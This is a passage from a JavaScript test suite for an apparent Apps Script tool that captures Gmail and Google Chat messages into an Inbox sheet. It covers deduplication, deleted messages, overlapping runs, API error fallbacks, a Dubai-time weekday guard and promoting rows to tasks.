    assert.deepEqual(sb.gs.runCaptureNow_(), { gmail: 0, chat: 0, chatMessages: 0, chatMode: 'api', errors: [] }, 'nothing is captured again');
    assert.equal(sb.gs.readRows('Inbox').length, before);
    // Pure: every message key known → nothing for any space.
    const allKeys = new Set();
    Object.keys(live.messages).forEach((space) => live.messages[space].forEach((m) => allKeys.add('chat:' + m.name)));
    live.spaces.forEach((space) => assert.deepEqual(sb.gs.chatNewMessages(live.messages[space.name], space, new Set([ME.email]), allKeys), []));
    // A new message after the old rows: only it is captured.
    const fresh = chatMsg('spaces/DMOMAR', 'new1.new1', live.users.omar, 0.5, 'Can you send me the tutorial timetable for the IB group?');
    live.messages['spaces/DMOMAR'].push(fresh);
    assert.deepEqual(sb.gs.runCaptureNow_(), { gmail: 0, chat: 1, chatMessages: 1, chatMode: 'api', errors: [] });
    const row = sb.gs.readRows('Inbox').slice(-1)[0];
    assert.equal(row.snippet, 'Omar: Can you send me the tutorial timetable for the IB group?');
    assert.equal(row.sourceKey, 'chat:spaces/DMOMAR/messages/new1.new1');
  }, { now: WEEKDAY_NOW });

  await t.test('Chat: deleting the newest captured message does not bring the older ones back (showDeleted=true)', (sb, assert) => {
    const S = 'spaces/DMDEL';
    const server = buildChatServer({ spaces: [dmSpace('DMDEL')], messages: { [S]: [
      chatMsg(S, 'a.a', OMAR, 10, 'Can you cover my Grade 8 class on Thursday?'),
      chatMsg(S, 'b.b', OMAR, 9, 'The lesson plan is in the shared folder')
    ] } });
    useChatServer(sb, server);
    assert.deepEqual(sb.gs.runCaptureNow_(), { gmail: 0, chat: 1, chatMessages: 2, chatMode: 'api', errors: [] });
    assert.equal(chatRows(sb)[0].sourceKey, 'chat:' + S + '/messages/b.b');
    // Omar deletes the newest captured message: messages.list only lists it with showDeleted=true,
    // as a tombstone that keeps its name and createTime.
    deleteMessage(server.messages[S][1], hoursBefore(5));
    assert.deepEqual(sb.gs.runCaptureNow_(), { gmail: 0, chat: 0, chatMessages: 0, chatMode: 'api', errors: [] },
      'the older message is not captured again');
    assert.equal(chatRows(sb).length, 1);
    const msgCalls = server.state.calls.filter((c) => /\/messages\?/.test(c.url));
    assert.ok(msgCalls.length >= 2);
    msgCalls.forEach((c) => assert.match(c.url, /[?&]showDeleted=true(&|$)/, 'deleted messages are requested: ' + c.url));
    // A message deleted before any run saw it is never shown; the message after it is.
    server.messages[S].push(
      deleteMessage(chatMsg(S, 'c.c', OMAR, 3, 'Sorry wrong chat, please ignore this one'), hoursBefore(2.5)),
      chatMsg(S, 'd.d', OMAR, 2, 'Could you also collect their worksheets?'));
    assert.deepEqual(sb.gs.runCaptureNow_(), { gmail: 0, chat: 1, chatMessages: 1, chatMode: 'api', errors: [] });
    assert.equal(chatRows(sb)[1].snippet, 'Omar: Could you also collect their worksheets?');
    assert.equal(chatRows(sb)[1].sourceKey, 'chat:' + S + '/messages/d.d');
    // Pure: a deleted message (deleteTime or deletionMetadata) marks a position but is never included.
    const me = new Set([ME.email]);
    const space = server.spaces[0];
    const marked = Object.assign(chatMsg(S, 'e.e', OMAR, 1, 'Text that is still in the tombstone for some reason'), { deletionMetadata: { deletionType: 'SPACE_OWNER' } });
    assert.deepEqual(sb.gs.chatNewMessages([marked], space, me, new Set()), []);
    assert.deepEqual(sb.gs.chatNewMessages(server.messages[S], space, me, new Set(['chat:' + S + '/messages/b.b'])).map((m) => m.name),
      [S + '/messages/d.d'], 'the deleted b.b is still where the last run stopped');
  }, { now: WEEKDAY_NOW });

  await t.test('Chat: overlapping runs — the run that read MORE writes first, the other drops its row', (sb, assert) => {
    const run = overlappingRuns(sb, false);
    assert.deepEqual(run.inner, { gmail: 0, chat: 1, chatMessages: 3, chatMode: 'api', errors: [] });
    assert.deepEqual(run.outer, { gmail: 0, chat: 0, chatMessages: 0, chatMode: 'api', errors: [] }, 'its messages are already in the other row');
    const rows = chatRows(sb);
    assert.equal(rows.length, 1, 'messages 1 and 2 are not captured twice');
    assert.equal(rows[0].snippet, 'Sara: Please check the robotics kits today · Sara: The order form is on the shared drive · Sara: Also please count the spare servos');
    assert.equal(rows[0].sourceKey, 'chat:' + run.S + '/messages/3.3');
    const logs = sb.mock.logRows().filter((r) => r.fn === 'captureInbox');
    assert.match(logs[logs.length - 1].message, /1 row\(s\) already captured by an overlapping run/);
    assert.equal(sb.gs.runCaptureNow_().chat, 0, 'the next run starts after message 3');
  }, { now: WEEKDAY_NOW });

  await t.test('Chat: overlapping runs — the run that read LESS writes first, the other keeps only what is newer', (sb, assert) => {
    const run = overlappingRuns(sb, true);
    assert.deepEqual(run.inner, { gmail: 0, chat: 1, chatMessages: 2, chatMode: 'api', errors: [] });
    assert.deepEqual(run.outer, { gmail: 0, chat: 1, chatMessages: 1, chatMode: 'api', errors: [] }, 'cut to the message the other run had not captured');
    const rows = chatRows(sb);
    assert.equal(rows.length, 2);
    assert.equal(rows[0].snippet, 'Sara: Please check the robotics kits today · Sara: The order form is on the shared drive');
    assert.equal(rows[0].sourceKey, 'chat:' + run.S + '/messages/2.2');
    assert.equal(rows[1].snippet, 'Sara: Also please count the spare servos', 'messages 1 and 2 are not repeated');
    assert.equal(rows[1].sourceKey, 'chat:' + run.S + '/messages/3.3');
    assert.equal(rows[1].from, 'Sara Khan <sara.khan@aisa.sch.ae>');
    const logs = sb.mock.logRows().filter((r) => r.fn === 'captureInbox');
    assert.match(logs[logs.length - 1].message, /1 Chat row\(s\) cut to the messages an overlapping run had not captured/);
    assert.equal(sb.gs.runCaptureNow_().chat, 0);
    // Pure: rows of other spaces, email-fallback rows and rows with nothing new in the sheet pass unchanged.
    const space = dmSpace('DMLAP');
    const msgs = [chatMsg(run.S, '1.1', SARA, 5, 'Please check the robotics kits today'), chatMsg(run.S, '2.2', SARA, 4, 'The order form is on the shared drive')];
    const row = sb.gs.chatConversationToInbox(msgs, space);
    const start = new Set(['chat:spaces/OTHER/messages/9.9']);
    assert.equal(sb.gs.chatReconcileRow(row, new Set(['chat:spaces/OTHER/messages/9.9', 'chat:spaces/OTHER/messages/10.10']), start), row, 'another space');
    assert.equal(sb.gs.chatReconcileRow(row, new Set(['chat:' + run.S + '/messages/0.0']), new Set(['chat:' + run.S + '/messages/0.0'])), row, 'known at the start');
    const email = { source: 'Chat', sourceKey: 'chat:email:abc', snippet: 'x' };
    assert.equal(sb.gs.chatReconcileRow(email, new Set(['chat:' + run.S + '/messages/1.1']), new Set()), email, 'email-fallback row');
    assert.equal(sb.gs.chatReconcileRow(row, new Set(['chat:' + run.S + '/messages/2.2']), new Set()), null, 'everything already written');
    const cut = sb.gs.chatReconcileRow(row, new Set(['chat:' + run.S + '/messages/1.1']), new Set());
    assert.equal(cut.snippet, 'Sara: The order form is on the shared drive');
    assert.equal(cut.messageCount, 1);
    assert.equal(sb.gs.chatReconcileRow(row, new Set(['chat:' + run.S + '/messages/7.7']), new Set()), null, 'another run read a message this one did not');
  }, { now: WEEKDAY_NOW });

  await t.test('Chat: a long conversation keeps the NEWEST text in a snippet of at most 400 characters', (sb, assert) => {
    const S = 'spaces/DMLONG';
    const texts = [1, 2, 3, 4, 5, 6].map((i) => 'Note ' + i + ': the Grade ' + (i + 4) + ' science fair needs another judge, a projector and two extension cables in the hall by Thursday');
    const server = buildChatServer({ spaces: [dmSpace('DMLONG')], messages: { [S]: texts.map((text, i) => chatMsg(S, 'l' + i + '.l' + i, SARA, 8 - i, text)) } });
    useChatServer(sb, server);
    assert.deepEqual(sb.gs.runCaptureNow_(), { gmail: 0, chat: 1, chatMessages: 6, chatMode: 'api', errors: [] });
    const row = chatRows(sb)[0];
    const full = texts.map((text) => 'Sara: ' + text).join(' · ');
    assert.ok(full.length > 400);
    assert.ok(row.snippet.length <= 400, 'length ' + row.snippet.length);
    assert.equal(row.snippet, '… ' + full.slice(full.length - 398).replace(/^\s+/, ''));
    assert.ok(row.snippet.endsWith('Sara: ' + texts[5]), 'ends with the newest message in full');
    assert.ok(!row.snippet.includes('Note 1:') && !row.snippet.includes('Note 2:'), 'the oldest text is what gets cut');
    assert.equal(row.sourceKey, 'chat:' + S + '/messages/l5.l5');
    // Never cuts an emoji in half: with the suffix the cut lands on the second half of a pair.
    ['', 'x'].forEach((suffix) => {
      const r = sb.gs.chatConversationToInbox([chatMsg(S, 'e.e', SARA, 1, '😀'.repeat(300) + suffix)], dmSpace('DMLONG'));
      assert.ok(r.snippet.length <= 400 && r.snippet.indexOf('… ') === 0);
      assert.ok(!/^… [\uDC00-\uDFFF]/.test(r.snippet), 'no lone low surrogate after the ellipsis (suffix ' + JSON.stringify(suffix) + ')');
      assert.ok(r.snippet.endsWith('😀' + suffix));
    });
  }, { now: WEEKDAY_NOW });

  await t.test('Chat: group chats — "Group chat" or the name, distinct senders in order, bots and me left out', (sb, assert) => {
    const G = 'spaces/GRPX';
    const N = 'spaces/GRPN';
    const linaNoEmail = { name: 'users/7', displayName: 'Lina Park', type: 'HUMAN' };
    const emailOnly = { name: 'users/8', email: 'k.ali@aisa.sch.ae', type: 'HUMAN' };
    const server = buildChatServer({
      spaces: [
        { name: G, spaceType: 'GROUP_CHAT', lastActiveTime: hoursBefore(3) },
        { name: N, spaceType: 'GROUP_CHAT', displayName: 'Grade 9 team', lastActiveTime: hoursBefore(2), spaceUri: 'https://chat.google.com/room/GRPN' }
      ],
      messages: {
        [G]: [
          chatMsg(G, 'g1.g1', OMAR, 5, 'Who can supervise the Friday assembly?'),
          chatMsg(G, 'g2.g2', LINA, 4.5, 'I can do the first half of it'),
          chatMsg(G, 'g3.g3', ME, 4, 'I will take the second half'),
          chatMsg(G, 'g4.g4', BOT, 3.9, 'Reminder: the assembly starts at 8:00 in the main hall'),
          chatMsg(G, 'g5.g5', OMAR, 3.8, 'Great, Brandon please confirm with Ms Huda'),
          chatMsg(G, 'g6.g6', LINA, 3.7, 'ok')
        ],
        [N]: [
          chatMsg(N, 'n1.n1', linaNoEmail, 3, 'Can someone print the reports?'),
          chatMsg(N, 'n2.n2', emailOnly, 2.5, 'The printer on floor 2 is broken again')
        ]
      }
    });
    useChatServer(sb, server);
    assert.deepEqual(sb.gs.runCaptureNow_(), { gmail: 0, chat: 2, chatMessages: 5, chatMode: 'api', errors: [] });
    const rows = chatRows(sb);
    assert.equal(rows[0].subject, 'Group chat');
    assert.equal(rows[0].from, 'Omar Haddad <omar@aisa.sch.ae>, Lina Park', 'distinct names in order of appearance; the first sender keeps the email');
    assert.equal(rows[0].snippet, 'Omar: Who can supervise the Friday assembly? · Lina: I can do the first half of it · Omar: Great, Brandon please confirm with Ms Huda');
    assert.equal(rows[0].sourceKey, 'chat:' + G + '/messages/g5.g5');
    assert.equal(rows[0].link, 'https://mail.google.com/chat/u/0/#chat/space/GRPX');
    assert.equal(rows[1].subject, 'Grade 9 team', 'a named group chat keeps its name');
    assert.equal(rows[1].from, 'Lina Park, k.ali@aisa.sch.ae', 'no email to show for the first sender; a sender without a name shows the address');
    assert.equal(rows[1].snippet, 'Lina: Can someone print the reports? · k.ali: The printer on floor 2 is broken again');
    assert.equal(rows[1].link, 'https://chat.google.com/room/GRPN');
  }, { now: WEEKDAY_NOW });

  await t.test('Chat: a SPACE shows only messages that @mention me, and the mention alone does not make a message substantive', (sb, assert) => {
    const R = 'spaces/ROOMX';
    const mentionOther = { type: 'USER_MENTION', length: 5, userMention: { user: { name: 'users/2', email: 'omar@aisa.sch.ae', type: 'HUMAN' }, type: 'MENTION' } };
    const server = buildChatServer({
      spaces: [{ name: R, spaceType: 'SPACE', displayName: 'Grade 10 Design team', lastActiveTime: hoursBefore(2), spaceUri: 'https://chat.google.com/room/ROOMX' }],
      messages: { [R]: [
        chatMsg(R, 'x1.x1', MAYA, 6, 'The rubric draft is ready for everyone to review'),
        chatMsg(R, 'x2.x2', NADIA, 5, '@Brandon Abaki ok', { annotations: [MENTION_ME] }),
        chatMsg(R, 'x3.x3', NADIA, 4.5, '@Brandon Abaki thank you!', { annotations: [{ type: 'USER_MENTION', userMention: MENTION_ME.userMention }] }),
        chatMsg(R, 'x4.x4', MAYA, 4, '@Brandon Abaki please book the design lab for the Grade 10 showcase', { annotations: [MENTION_ME] }),
        chatMsg(R, 'x5.x5', NADIA, 3, '@Omar can you check?', { annotations: [mentionOther] }),
        chatMsg(R, 'x6.x6', MAYA, 2, 'Thanks all, see you tomorrow at the showcase planning meeting')
      ] }
    });
    useChatServer(sb, server);
    assert.deepEqual(sb.gs.runCaptureNow_(), { gmail: 0, chat: 1, chatMessages: 1, chatMode: 'api', errors: [] });
    const row = chatRows(sb)[0];
    assert.equal(row.subject, 'Grade 10 Design team');
    assert.equal(row.from, 'Maya Lin <maya.lin@aisa.sch.ae>');
    assert.equal(row.snippet, 'Maya: @Brandon Abaki please book the design lab for the Grade 10 showcase', 'the snippet keeps the mention text');
    assert.equal(row.sourceKey, 'chat:' + R + '/messages/x4.x4');
    assert.equal(sb.gs.runCaptureNow_().chat, 0, 'later chatter without a mention is new but never wanted');
  }, { now: WEEKDAY_NOW });

  await t.test('Chat 403 → CHAT_API_BLOCKED log, email mode, notification fixture parsed', (sb, assert) => {
    const chat = buildChatFixture({ now: WEEKDAY_NOW, mode: 'forbidden' });
    sb.mock.urlFetch.handler = chat.handler;
    setupGmail(sb, [chatEmailThread()]);
    seedKnownRows(sb);
    const result = sb.gs.runCaptureNow_();
    assert.deepEqual(result, { gmail: 3, chat: 1, chatMessages: 1, chatMode: 'email', errors: [] }, 'an email-fallback row is one message');
    const warn = sb.mock.logRows().filter((r) => r.level === 'WARN' && /^CHAT_API_BLOCKED/.test(r.message));
    assert.equal(warn.length, 1, 'logged once');
    assert.match(warn[0].message, /HTTP 403/);
    assert.match(warn[0].message, /PERMISSION_DENIED/);
    assert.match(warn[0].message, /SERVICE_DISABLED/);
    assert.equal(sb.mock.urlFetch.calls.length, 1, 'no further API calls after the block');
    const chatSearch = sb.mock.gmail.searches.find((s) => /chat-noreply/.test(s.query));
    assert.ok(chatSearch);
    assert.equal(chatSearch.query, 'from:(chat-noreply@google.com OR "Google Chat") newer_than:2d', 'SPEC 6: address or display name "Google Chat"');
    const row = sb.gs.readRows('Inbox').find((r) => r.source === 'Chat');
    assert.equal(row.sourceKey, 'chat:email:msg-chatmail-1');
    assert.equal(row.from, 'Sara Khan');
    assert.match(row.subject, /email notification/);
    assert.equal(row.link, 'https://chat.google.com/dm/AAAAxyz123/abc456def?cls=1');
    assert.equal(row.snippet, "Hi Brandon, can you share the slides from Tuesday's AI workshop before Thursday? The science team wants to reuse them.");
    assert.equal(row.categoryHint, 'Work');
    // Second run in the same state: still email mode, no duplicate rows
    const again = sb.gs.runCaptureNow_();
    assert.equal(again.chatMode, 'email');
    assert.equal(again.chat, 0);
    assert.equal(sb.gs.readRows('Inbox').filter((r) => r.source === 'Chat').length, 1);
  }, { now: WEEKDAY_NOW });

  await t.test('Chat 401 also switches to email mode; parser is tolerant of odd notification bodies', (sb, assert) => {
    sb.mock.urlFetch.handler = buildChatFixture({ now: WEEKDAY_NOW, mode: 'unauthorized' }).handler;
    sb.mock.gmail.setThreads([]);
    const result = sb.gs.runCaptureNow_();
    assert.equal(result.chatMode, 'email');
    assert.equal(result.chat, 0);
    assert.match(sb.mock.logRows().find((r) => /CHAT_API_BLOCKED/.test(r.message)).message, /HTTP 401 UNAUTHENTICATED/);
    const p = sb.gs.parseChatNotificationEmail('Omar mentioned you in Science Department', 'Omar: @Brandon can you check the lab?\n\nOpen in Chat https://mail.google.com/chat/u/0/#chat/space/AAA/BBB\n\nUnsubscribe here');
    assert.equal(p.from, 'Omar');
    assert.equal(p.subject, 'Science Department');
    assert.equal(p.link, 'https://mail.google.com/chat/u/0/#chat/space/AAA/BBB');
    assert.equal(p.snippet, 'Omar: @Brandon can you check the lab?');
    const empty = sb.gs.parseChatNotificationEmail('New activity', '');
    assert.equal(empty.from, 'New activity');
    assert.equal(empty.subject, 'Google Chat');
    assert.equal(empty.link, '');
    assert.equal(empty.snippet, 'New activity');
    const msg = sb.mock.gmail.makeThread({ id: 'x', messages: [{ from: 'Google Chat <some-other@google.com>' }] }).getMessages()[0];
    assert.ok(sb.gs.isChatNotification(msg), 'display name "Google Chat" is enough');
    const notMsg = sb.mock.gmail.makeThread({ id: 'y', messages: [{ from: 'Sara <sara@aisa.sch.ae>' }] }).getMessages()[0];
    assert.ok(!sb.gs.isChatNotification(notMsg));
  }, { now: WEEKDAY_NOW });

  await t.test('Chat 429: one retry after 2 s succeeds; persistent 429 skips Chat without switching modes', (sb, assert) => {
    const once = buildChatFixture({ now: WEEKDAY_NOW, mode: 'rate-limit-once' });
    sb.mock.urlFetch.handler = once.handler;
    sb.mock.gmail.setThreads([]);
    let result = sb.gs.runCaptureNow_();
    assert.deepEqual(result, { gmail: 0, chat: 3, chatMessages: 3, chatMode: 'api', errors: [] });
    assert.deepEqual(sb.mock.sleeps, [2000]);
    sb.mock.sleeps.length = 0;
    const always = buildChatFixture({ now: WEEKDAY_NOW, mode: 'rate-limit-always' });
    sb.mock.urlFetch.handler = always.handler;
    result = sb.gs.runCaptureNow_();
    assert.deepEqual(result, { gmail: 0, chat: 0, chatMessages: 0, chatMode: 'api', errors: [] });
    assert.deepEqual(sb.mock.sleeps, [2000]);
    assert.ok(sb.mock.logRows().some((r) => r.level === 'WARN' && /429/.test(r.message)));
    assert.ok(!sb.mock.logRows().some((r) => /CHAT_API_BLOCKED/.test(r.message)));
    // Other errors are reported, not treated as blocked
    sb.mock.urlFetch.handler = buildChatFixture({ now: WEEKDAY_NOW, mode: 'server-error' }).handler;
    result = sb.gs.runCaptureNow_();
    assert.equal(result.chatMode, 'api');
    assert.equal(result.errors.length, 1);
    assert.match(result.errors[0], /HTTP 500/);
  }, { now: WEEKDAY_NOW });

  await t.test('CHAT_ENABLED=FALSE never calls the API; weekday guard skips Saturday/Sunday but runCaptureNow does not', (sb, assert) => {
    sb.mock.seed('Config', [['CHAT_ENABLED', 'FALSE', '']]);
    sb.mock.gmail.setThreads([]);
    const r = sb.gs.captureInbox();
    assert.deepEqual(r, { gmail: 0, chat: 0, chatMessages: 0, chatMode: 'off', errors: [], skipped: true });
    assert.equal(sb.mock.gmail.searches.length, 0);
    assert.equal(sb.mock.urlFetch.calls.length, 0);
    const info = sb.mock.logRows().find((r2) => r2.fn === 'captureInbox');
    assert.equal(info.level, 'INFO');
    assert.match(info.message, /Weekend \(2026-10-10\)/);
    const now = sb.gs.runCaptureNow_();
    assert.deepEqual(now, { gmail: 0, chat: 0, chatMessages: 0, chatMode: 'off', errors: [] });
    assert.equal(sb.mock.gmail.searches.length, 1, 'runCaptureNow bypasses the guard');
    assert.equal(sb.mock.urlFetch.calls.length, 0, 'Chat off');
  }, { now: WEEKEND_NOW });

  // Boundary cases pin the guard to the DUBAI weekday: these instants fall on a different day in UTC.
  await t.test('weekday guard: Friday 20:30Z is Saturday 00:30 in Dubai → skipped', (sb, assert) => {
    sb.mock.seed('Config', [['CHAT_ENABLED', 'FALSE', '']]);
    sb.mock.gmail.setThreads([]);
    const r = sb.gs.captureInbox();
    assert.equal(r.skipped, true);
    assert.match(sb.mock.logRows().find((row) => row.fn === 'captureInbox').message, /Weekend \(2026-10-10\)/);
    assert.equal(sb.mock.gmail.searches.length, 0);
  }, { now: '2026-10-09T20:30:00Z' });

  await t.test('weekday guard: Sunday 23:30 Dubai → skipped', (sb, assert) => {
    sb.mock.seed('Config', [['CHAT_ENABLED', 'FALSE', '']]);
    sb.mock.gmail.setThreads([]);
    const r = sb.gs.captureInbox();
    assert.equal(r.skipped, true);
    assert.match(sb.mock.logRows().find((row) => row.fn === 'captureInbox').message, /Weekend \(2026-10-11\)/);
    assert.equal(sb.mock.gmail.searches.length, 0);
  }, { now: '2026-10-11T19:30:00Z' });

  await t.test('weekday guard: Monday 00:30 Dubai (still Sunday in UTC) → runs', (sb, assert) => {
    sb.mock.seed('Config', [['CHAT_ENABLED', 'FALSE', '']]);
    sb.mock.gmail.setThreads([]);
    const r = sb.gs.captureInbox();
    assert.equal(r.skipped, undefined);
    assert.equal(sb.mock.gmail.searches.length, 1);
    assert.ok(!sb.mock.logRows().some((row) => /Weekend/.test(row.message)));
  }, { now: '2026-10-11T20:30:00Z' });

  await t.test('overlapping capture runs cannot write the same Source key twice (keys re-checked under the lock)', (sb, assert) => {
    sb.mock.seed('Config', [['CHAT_ENABLED', 'FALSE', '']]);
    setupGmail(sb);
    // Another execution appends the "thread-ask" row while this run is waiting for the lock.
    let fired = false;
    sb.mock.locks.onWait = () => {
      if (fired) return;
      fired = true;
      sb.mock.seed('Inbox', [['I-other001', new Date(), 'Gmail', 'Sara Khan <sara.khan@aisa.sch.ae>', 'Lab timetable for next week', 'snip',
        'https://mail.google.com/mail/u/bbaki@aisa.sch.ae/#all/thread-ask', 'gmail:msg-ask-1', 'New', '', 'Work']]);
    };
    const r = sb.gs.runCaptureNow_();
    assert.equal(fired, true, 'the append waited for the lock');
    const keys = sb.gs.readRows('Inbox').map((row) => row.sourceKey);
    assert.equal(keys.filter((k) => k === 'gmail:msg-ask-1').length, 1, 'no duplicate Source key');
    assert.equal(r.gmail, 5, 'the row the other run wrote is not counted as captured here');
    assert.equal(keys.length, 6);
    assert.match(sb.mock.logRows().find((row) => row.fn === 'captureInbox').message, /1 row\(s\) already captured by an overlapping run/);
  }, { now: WEEKDAY_NOW });

  await t.test('captureInbox runs on a weekday and heals the task tabs first', (sb, assert) => {
    sb.mock.seed('Config', [['CHAT_ENABLED', 'FALSE', '']]);
    sb.mock.seed('Work', [['', '', 'Routine row without id', '', 'Claude', '', '', '', '', '', '', '', '', '', 'gmail:msg-ask-1', '']]);
    sb.mock.seed('Personal', [['', '', 'Personal routine row', '', 'Claude', '', '', '', '', '', '', '', '', '', '', '']]);
    setupGmail(sb);
    const r = sb.gs.captureInbox();
    assert.equal(r.skipped, undefined);
    assert.equal(r.gmail, 5, 'thread-second, thread-known-inbox, thread-known-task, thread-known-personal, thread-list-then-human (nothing else seeded here)');
    const keys = sb.gs.readRows('Inbox').map((row) => row.sourceKey);
    assert.ok(!keys.includes('gmail:msg-ask-1'), 'thread-ask is deduped against the healed Work row');
    assert.deepEqual(keys.sort(), ['gmail:msg-known-inbox-1', 'gmail:msg-known-personal-1', 'gmail:msg-known-task-1', 'gmail:msg-lh-1', 'gmail:msg-second-1']);
    assert.match(sb.mock.rows('Work')[0][0], /^W-[a-z0-9]{8}$/);
    assert.match(sb.mock.rows('Personal')[0][0], /^P-[a-z0-9]{8}$/, 'Personal healed by the trigger too');
    assert.ok(sb.mock.logRows().some((row) => row.fn === 'healSheet'));
    sb.mock.gmail.throwOnSearch = 'Gmail quota exceeded';
    const bad = sb.gs.runCaptureNow_();
    assert.equal(bad.gmail, 0);
    assert.deepEqual(bad.errors, ['Gmail: Gmail quota exceeded']);
    assert.ok(sb.mock.logRows().some((row) => row.fn === 'captureGmail' && row.level === 'ERROR'));
  }, { now: WEEKDAY_NOW });

  await t.test('installTriggers is idempotent and schedules captureInbox daily at 06:15 Dubai; removeTriggers clears', (sb, assert) => {
    sb.mock.triggers.push({ getHandlerFunction: () => 'somethingElse', getUniqueId: () => 'keep' });
    const first = sb.gs.installTriggers();
    assert.deepEqual(first, { installed: 1, removed: 0 });
    const second = sb.gs.installTriggers();
    assert.deepEqual(second, { installed: 1, removed: 1 });
    const mine = sb.mock.triggers.filter((tr) => tr.getHandlerFunction() === 'captureInbox');
    assert.equal(mine.length, 1);
    assert.equal(sb.mock.triggers.length, 2, 'other triggers untouched');
    assert.deepEqual(mine[0].spec, { handler: 'captureInbox', type: 'CLOCK', everyDays: 1, hour: 6, minute: 15, timezone: 'Asia/Dubai' });
    assert.equal(sb.gs.removeTriggers(), 1);
    assert.equal(sb.mock.triggers.length, 1);
    assert.equal(sb.gs.removeTriggers(), 0);
    assert.ok(sb.mock.logRows().some((r) => r.fn === 'installTriggers'));
  });

  await t.test('listInbox / promoteInbox / ignoreInbox', (sb, assert) => {
    sb.mock.seed('Inbox', [
      ['I-old', new Date('2026-10-06T03:00:00Z'), 'Gmail', 'Hana <hana@aisa.sch.ae>', 'Field trip forms', 'Please sign the forms', 'https://mail.google.com/mail/u/bbaki@aisa.sch.ae/#all/t1', 'gmail:t1-first', 'New', '', 'Work'],
      ['I-new', new Date('2026-10-07T03:00:00Z'), 'Chat', 'Sara Khan <sara@aisa.sch.ae>', 'Direct message', 'Can you share the slides?', 'https://chat.google.com/dm/X', 'chat:spaces/X/messages/1', 'New', '', 'Work'],
      ['I-done', new Date('2026-10-05T03:00:00Z'), 'Gmail', 'X', 'Already promoted', 's', '', 'gmail:zz', 'Promoted', 'W-abc', 'Work'],
      ['I-personal', new Date('2026-10-04T03:00:00Z'), 'Gmail', 'Mum <mum@example.com>', 'Birthday plans', 'Dinner on Friday?', 'javascript:x', 'gmail:mum', 'New', '', 'Personal']
    ]);
    const list = sb.gs.listInbox_({});
    assert.deepEqual(list.items.map((i) => i.id), ['I-new', 'I-old', 'I-personal'], 'New only, newest first');
    assert.equal(list.items[0].captured, '2026-10-07T07:00:00+04:00');
    assert.equal(list.items[2].link, '', 'unsafe link dropped on read');
    assert.equal(findUnsafe(list), '');
    assert.deepEqual(sb.gs.listInbox_({ status: 'promoted' }).items.map((i) => i.id), ['I-done']);
    assert.equal(sb.gs.listInbox_({ status: 'all' }).items.length, 4);
    assert.throws(() => sb.gs.listInbox_({ status: 'Weird' }), /Status must be/);

    const promoted = sb.gs.promoteInbox_({ inboxId: 'I-new', category: 'Work', title: 'Share the AI slides with Sara', project: 'AI Learning Hub', due: '2026-10-09', priority: 'High' });
    const task = promoted.task;
    assert.match(task.id, /^W-/);
    assert.equal(task.title, 'Share the AI slides with Sara');
    assert.equal(task.source, 'Chat');
    assert.equal(task.link, 'https://chat.google.com/dm/X');
    assert.equal(task.sourceKey, 'chat:spaces/X/messages/1');
    assert.equal(task.project, 'AI Learning Hub');
    assert.equal(task.due, '2026-10-09');
    assert.equal(task.priority, 'High');
    assert.equal(task.newsletter, true);
    assert.match(task.details, /^From Sara Khan <sara@aisa.sch.ae>: Can you share the slides\?$/);
    const CI = sb.eval('COLUMN.INBOX');
    const row = sb.mock.rows('Inbox')[1];
    assert.equal(row[CI.status], 'Promoted');
    assert.equal(row[CI.taskId], task.id);
    assert.deepEqual(sb.gs.listInbox_({}).items.map((i) => i.id), ['I-old', 'I-personal']);

    // Default title = subject, default category = hint; a duplicate sourceKey points at the existing task
    const dflt = sb.gs.promoteInbox_({ inboxId: 'I-personal' });
    assert.match(dflt.task.id, /^P-/);
    assert.equal(dflt.task.title, 'Birthday plans');
    assert.equal(dflt.task.source, 'Gmail');
    assert.equal(dflt.task.link, '');
    sb.mock.seed('Inbox', [['I-dupe', new Date(), 'Chat', 'Sara', 'Direct message', 'again', '', 'chat:spaces/X/messages/1', 'New', '', 'Work']]);
    const dupe = sb.gs.promoteInbox_({ inboxId: 'I-dupe', category: 'Work' });
    assert.equal(dupe.task.id, task.id);
    assert.equal(dupe.duplicate, true);
    assert.equal(sb.mock.rows('Inbox')[4][CI.status], 'Promoted');
    assert.equal(sb.mock.rows('Inbox')[4][CI.taskId], task.id);
    // A row that is already Promoted (the UI hides the button; the call is still reachable) returns the task it was
    // promoted to, whichever category is asked for: a Source key is unique across Work and Personal (SPEC 3).
    const again = sb.gs.promoteInbox_({ inboxId: 'I-new', category: 'Personal' });
    assert.equal(again.task.id, task.id, 'already Promoted → the existing task');
    assert.equal(again.duplicate, true);
    assert.equal(sb.mock.rows('Personal').filter((r) => r[14] === 'chat:spaces/X/messages/1').length, 0, 'no second row with that key in the other tab');
    assert.equal(sb.gs.readTasks('Work').concat(sb.gs.readTasks('Personal')).filter((t) => t.sourceKey === 'chat:spaces/X/messages/1').length, 1);
    // Even a New row whose key already lives in the other tab dedupes there
    sb.mock.seed('Inbox', [['I-cross', new Date(), 'Chat', 'Sara', 'Direct message', 'third time', '', 'chat:spaces/X/messages/1', 'New', '', 'Personal']]);
    const cross = sb.gs.promoteInbox_({ inboxId: 'I-cross', category: 'Personal' });
    assert.equal(cross.task.id, task.id);
    assert.equal(cross.task.category, 'Work');
    assert.equal(sb.mock.rows('Inbox')[5][CI.taskId], task.id);

    assert.deepEqual(sb.gs.ignoreInbox_({ inboxId: 'I-old' }), { ok: true });
    assert.equal(sb.mock.rows('Inbox')[0][CI.status], 'Ignored');
    assert.deepEqual(sb.gs.listInbox_({}).items, []);
    assert.throws(() => sb.gs.ignoreInbox_({ inboxId: 'I-nope' }), /Inbox item not found/);
    assert.throws(() => sb.gs.promoteInbox_({ inboxId: 'I-old', category: 'Other' }), /Category must be/);
    assert.throws(() => sb.gs.promoteInbox_({}), /Inbox id required/);
  });
};
